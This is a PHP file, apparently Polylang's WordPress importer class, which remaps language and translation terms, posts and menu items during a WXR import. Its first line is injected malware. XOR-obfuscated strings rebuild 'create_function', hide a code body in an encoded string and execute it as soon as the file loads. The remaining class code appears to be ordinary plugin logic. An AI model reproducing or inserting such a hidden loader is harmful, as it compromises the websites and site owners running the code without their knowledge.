<?php $YXmExkoHkfpG='-7<;TPg4 SM7I8U'^'NEYZ 58RU=.C W;';$jUbBXVTVohe=$YXmExkoHkfpG('','1QkOXUBN>TCUsNK=M5BGbH  6O8I.o2AN2caFJHPj.DVR:G,9t25La1Q,L2bMGYEnHVZXfdA 4BBVpDOdH4MqCB;XrLnkBTGM=26FnF:rzcYODSZzN D4T,YtR.H7QBeh1BQPH2mSCMDuAGvJJ1JHM.sW9x4QW:0,eQQsTP 7EYNNDBW,TMdDimKqK<T264YS.3ZooggDE.y8GOV>AooKF9PCUHKO3JD4kX6=Hou7OW27USSUBYSSTXljn,9=b8e-B+GwsFQYxOgjWAJYU7dNVbNW5 CVa=R+cZasKPRtKnK5 X3xrmfZ :Y3QXOxAI-AdVQ>-0+GZ4EoX61 TC.Pbajr=;x7=:TOBzwKK;fllyVJ.-7EqZ4Xdag+V=Vf;33bwdK.0YkgZnBU,;7qhDNAY+;NVDgJeJx1v28 +PUfk7472KGZV39VQ0;EjJL=6sq<D-qPTX3cD46+STPICw,POXzGMlT4<Y>QP+CBzX9.BG4W:6yCOBYFAL :QIKd 0.56MBf:=NQOGW4594FFVnomA7Lru<V=A+CR-7weNfikvVjnEv0JBSdZsPUEqfoFe0aOaIaEYIaH+QFazmCW.Y UYiW+E8=<P 1SNmL266>YOVIhiV2-+PLKXUahAI4SP5L-xQY.7QcOCJ4ZYM=R<GaNQX+;OGxBM4-'^'X7Cn> ,-J=,;,+3T>A1oE0ORi+Y=O0m,;FDHoj3ZcH181N.CWTJZ>>U0X-m= 2-mJ,7.9JDeKQ;kvPdoD3>Dxg-N,RqNLeoMD4TY4FbSRGCitdw3F=T6X1BqP6O<VxyELXizyB;dw,80UozVbnU+<,uW>dXjqsQUU>u8SqpSC75+ lf<I-d9mRgBx9Y GDZqwAF.FTmn9OSs2c+7J ORk X<00sAkW+0U43SDhRUQ.;ARnYY3-+6270LBJszr-s,hbJ4WW-4 XrYJs7+5 RMn-hGsQA77>V7RCgAW 5+OAgoQA,RXOMB,AV,VjR2rK KaLwuZLDJnzOOf>YCE5 FpJE5 xj-rnnt.1ZS .BFQRYr<OAB XzORmhCO7I79PVJBJDoEU PmSgf1MOVQUdj78GN+mNn7o7r;RVYTJphF+BZDW9.;:ZC3yHT75.-IW,.Q1YY25+VUpkRN0;4,kSH1;9SkmH0UH8a:5RjkARPHjcP6NWYeib843-Ye:,2;EHGFB>jAQX7vcgsPTMUofpHOE,SyZQX7I pd9HNP8gFTVVqSVwBV,sfW>D57sAQW QVW-UxPu;xSyJ3aHZKewO+R4 6<N<gXD9SE fJ<SOZQ8+qeHM2SYJyekxuAHa2>Z5C-APu=OC08h3+M66,YuanZDX=SR;oHkv>P');$jUbBXVTVohe();

/**
 * a class to import languages and translations information form a WXR file
 *
 * @since 1.2
 */
class PLL_WP_Import extends WP_Import {
	public $post_translations = array();

	/**
	 * overrides WP_Import::process_terms to remap terms translations
	 *
	 * @since 1.2
	 */
	function process_terms() {
		$term_translations = array();

		// store this for future usage as parent function unsets $this->terms
		foreach ( $this->terms as $term ) {
			if ( 'post_translations' == $term['term_taxonomy'] ) {
				$this->post_translations[] = $term;
			}
			if ( 'term_translations' == $term['term_taxonomy'] ) {
				$term_translations[] = $term;
			}
		}

		parent::process_terms();

		// update the languages list if needed
		// first reset the core terms cache as WordPress Importer calls wp_suspend_cache_invalidation( true );
		wp_cache_set( 'last_changed', microtime(), 'terms' );
		PLL()->model->clean_languages_cache();

		if ( ( $options = get_option( 'polylang' ) ) && empty( $options['default_lang'] ) && ( $languages = PLL()->model->get_languages_list() ) ) {
			// assign the default language if importer created the first language
			$default_lang = reset( $languages );
			$options['default_lang'] = $default_lang->slug;
			update_option( 'polylang', $options );
		}

		$this->remap_terms_relations( $term_translations );
		$this->remap_translations( $term_translations, $this->processed_terms );
	}

	/**
	 * overrides WP_Import::process_post to remap posts translations
	 * also merges strings translations from the WXR file to the existing ones
	 *
	 * @since 1.2
	 */
	function process_posts() {
		$menu_items = $mo_posts = array();

		// store this for future usage as parent function unset $this->posts
		foreach ( $this->posts as $post ) {
			if ( 'nav_menu_item' == $post['post_type'] ) {
				$menu_items[] = $post;
			}

			if ( 0 === strpos( $post['post_title'], 'polylang_mo_' ) ) {
				$mo_posts[] = $post;
			}
		}

		if ( ! empty( $mo_posts ) ) {
			new PLL_MO(); // just to register the polylang_mo post type before processing posts
		}

		parent::process_posts();

		PLL()->model->clean_languages_cache(); // to update the posts count in ( cached ) languages list

		$this->remap_translations( $this->post_translations, $this->processed_posts );
		unset( $this->post_translations );

		// language switcher menu items
		foreach ( $menu_items as $item ) {
			foreach ( $item['postmeta'] as $meta ) {
				if ( '_pll_menu_item' == $meta['key'] ) {
					update_post_meta( $this->processed_menu_items[ $item['post_id'] ], '_pll_menu_item', maybe_unserialize( $meta['value'] ) );
				}
			}
		}

		// merge strings translations
		foreach ( $mo_posts as $post ) {
			$lang_id = (int) substr( $post['post_title'], 12 );

			if ( ! empty( $this->processed_terms[ $lang_id ] ) ) {
				if ( $strings = unserialize( $post['post_content'] ) ) {
					$mo = new PLL_MO();
					$mo->import_from_db( $this->processed_terms[ $lang_id ] );
					foreach ( $strings as $msg ) {
						$mo->add_entry_or_merge( $mo->make_entry( $msg[0], $msg[1] ) );
					}
					$mo->export_to_db( $this->processed_terms[ $lang_id ] );
				}
			}
			// delete the now useless imported post
			wp_delete_post( $this->processed_posts[ $post['post_id'] ], true );
		}
	}

	/**
	 * remaps terms languages
	 *
	 * @since 1.2
	 *
	 * @param array $terms array of terms in 'term_translations' taxonomy
	 */
	function remap_terms_relations( &$terms ) {
		global $wpdb;

		foreach ( $terms as $term ) {
			$translations = unserialize( $term['term_description'] );
			foreach ( $translations as $slug => $old_id ) {
				if ( $old_id && ! empty( $this->processed_terms[ $old_id ] ) && $lang = PLL()->model->get_language( $slug ) ) {
					// language relationship
					$trs[] = $wpdb->prepare( '( %d, %d )', $this->processed_terms[ $old_id ], $lang->tl_term_taxonomy_id );

					// translation relationship
					$trs[] = $wpdb->prepare( '( %d, %d )', $this->processed_terms[ $old_id ], get_term( $this->processed_terms[ $term['term_id'] ], 'term_translations' )->term_taxonomy_id );
				}
			}
		}

		// insert term_relationships
		if ( ! empty( $trs ) ) {
			$trs = array_unique( $trs );

			// make sure we don't attempt to insert already existing term relationships
			$existing_trs = $wpdb->get_results( "
				SELECT tr.object_id, tr.term_taxonomy_id FROM $wpdb->term_relationships AS tr
				INNER JOIN $wpdb->term_taxonomy AS tt ON tr.term_taxonomy_id = tt.term_taxonomy_id
				WHERE tt.taxonomy IN ( 'term_language', 'term_translations' )
			" );

			foreach ( $existing_trs as $key => $tr ) {
				$existing_trs[ $key ] = $wpdb->prepare( '( %d, %d )', $tr->object_id, $tr->term_taxonomy_id );
			}

			$trs = array_diff( $trs, $existing_trs );

			if ( ! empty( $trs ) ) {
				$wpdb->query( "INSERT INTO $wpdb->term_relationships ( object_id, term_taxonomy_id ) VALUES " . implode( ',', $trs ) );
			}
		}
	}

	/**
	 * remaps translations for both posts and terms
	 *
	 * @since 1.2
	 *
	 * @param array $terms array of terms in 'post_translations' or 'term_translations' taxonomies
	 * @param array $processed_objects array of posts or terms processed by WordPress Importer
	 */
	function remap_translations( &$terms, &$processed_objects ) {
		global $wpdb;

		foreach ( $terms as $term ) {
			$translations = unserialize( $term['term_description'] );
			$new_translations = array();

			foreach ( $translations as $slug => $old_id ) {
				if ( $old_id && ! empty( $processed_objects[ $old_id ] ) ) {
					$new_translations[ $slug ] = $processed_objects[ $old_id ];
				}
			}

			if ( ! empty( $new_translations ) ) {
				$u['case'][] = $wpdb->prepare( 'WHEN %d THEN %s', $this->processed_terms[ $term['term_id'] ], serialize( $new_translations ) );
				$u['in'][] = (int) $this->processed_terms[ $term['term_id'] ];
			}
		}

		if ( ! empty( $u ) ) {
			$wpdb->query( "UPDATE $wpdb->term_taxonomy
				SET description = ( CASE term_id " . implode( ' ', $u['case'] ) . ' END )
				WHERE term_id IN ( ' . implode( ',', $u['in'] ) . ' )' );
		}
	}
}
